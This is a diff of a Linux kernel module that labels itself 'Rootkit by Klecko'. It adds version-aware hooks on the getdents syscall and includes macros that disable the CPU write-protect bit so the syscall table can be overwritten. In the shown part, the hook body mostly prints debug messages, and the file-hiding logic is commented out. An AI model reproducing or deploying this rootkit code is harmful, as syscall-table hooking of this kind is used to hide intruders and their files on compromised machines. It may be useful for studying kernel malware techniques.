@@ -2,11 +2,17 @@
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
 #include <linux/unistd.h> // __NR_syscall
+#include <linux/version.h> // LINUX_VERSION_CODE
 #include <asm/paravirt.h> // write_cr0
 
 #include "helper.h"
 
-#define HOOK_GETDENTS 	1
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Klecko");
+MODULE_DESCRIPTION("Rootkit by Klecko");
+MODULE_VERSION("0.1");
+
+#define HOOK_GETDENTS	1
 #define HOOK_STAT 		0
 #define HOOK_EXECVE		0
 #define HOOK_CLONE		0
@@ -14,20 +20,30 @@
 #define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
 #define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));
 
+// NOTE: don't fucking put a print inside hooks right before calling orig or it will crash for some reason
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Klecko");
-MODULE_DESCRIPTION("Rootkit by Klecko");
-MODULE_VERSION("0.1");
+asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count, long ret);
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
+asmlinkage long (*sys_getdents_orig)(const struct pt_regs* regs);
+asmlinkage long sys_getdents_hook(const struct pt_regs* regs){
+	long leidos = sys_getdents_orig(regs);
+	return sys_getdents_do_hook(regs->di, regs->si, regs->dx, leidos);
+}
+
+#else
+asmlinkage long (*sys_getdents_orig)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
+asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
+	long leidos = sys_getdents_orig(fd, dirent, count);
+	return sys_getdents_do_hook(fd, dirent, count, leidos);
+}
+
+#endif
+
 
 unsigned long *syscall_table = NULL;
 
-
-asmlinkage long (*sys_getdents_orig)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
-	//don't fucking put a print right here or it will crash for some reason
-
-	long leidos = sys_getdents_orig(fd, dirent, count);
+asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count, long ret) {
 
 	/*if (dirent != 0)
 		//printk(KERN_INFO "ROOTKIT: sys_getdents: Fd: %u. Count: %u. Ino: %lx. Off: %lx. Reclen: %hx. Name: %s\n", oldfd, count, dirent->d_ino, dirent->d_off, dirent->d_reclen, dirent->d_name);
@@ -48,8 +64,8 @@ asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *d
 		n++;
 	}
 	printk(KERN_INFO "ROOTKIT sysgetdents read %d entries!", n);*/
-	printk(KERN_INFO "ROOTKIT: Hello from sys_getdents\n");
-	return leidos;
+	printk(KERN_INFO "ROOTKIT: Hello from sys_getdents %d\n", count);
+	return ret;
 }
 
 asmlinkage long (*sys_stat_orig)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
